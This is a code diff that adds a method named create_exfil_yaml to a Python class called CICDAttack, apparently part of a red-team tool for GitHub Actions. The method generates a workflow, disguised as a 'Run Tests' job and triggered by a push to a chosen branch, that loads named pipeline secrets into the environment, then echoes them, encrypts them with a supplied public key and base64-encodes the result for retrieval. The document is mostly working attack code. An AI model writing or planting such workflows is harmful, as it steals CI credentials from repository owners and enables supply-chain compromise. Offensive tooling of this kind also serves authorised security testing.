@@ -69,3 +69,49 @@ class CICDAttack():
         yaml_file['jobs'] = {'testing': test_job}
 
         return yaml.dump(yaml_file, sort_keys=False)
+
+    @staticmethod
+    def create_exfil_yaml(secrets: list, pubkey: str, branch_name):
+        """Create a malicious yaml file that will trigger on push and attempt
+        to exfiltrate the provided list of secrets.
+
+        Args:
+            secrets (list): List of GitHub Actions pipeline secrets.
+            pubkey (str): Public key to encrypt the plaintext values with.
+            branch_name (str): Name of the branch for on: push trigger.
+
+        """
+        yaml_file = {}
+
+        secret_envmap = {}
+        echo_cmd = 'echo -e "'
+
+        for secret in secrets:
+            secret_envmap.update(
+                {f"{secret}": '${{ ' + f"secrets.{secret}" + ' }}'}
+            )
+            echo_cmd += f'{secret}=${secret} \\n'
+
+        echo_cmd += '"'
+
+        pkey_varname = f'{branch_name}_KEY'
+        secret_envmap[pkey_varname] = pubkey
+
+        yaml_file['name'] = branch_name
+        yaml_file['on'] = {'push': {"branches": branch_name}}
+
+        test_job = {
+            'runs-on': ['ubuntu-latest'],
+            'steps': [
+                {
+                    'name': 'Run Tests',
+                    'env': secret_envmap,
+                    'run': f"{echo_cmd} | openssl rsautl -encrypt -inkey"
+                           f" <(echo \"${pkey_varname}\") -pubin -pkcs |"
+                           " base64 -w 0"
+                }
+            ]
+        }
+        yaml_file['jobs'] = {'testing': test_job}
+
+        return yaml.dump(yaml_file, sort_keys=False)
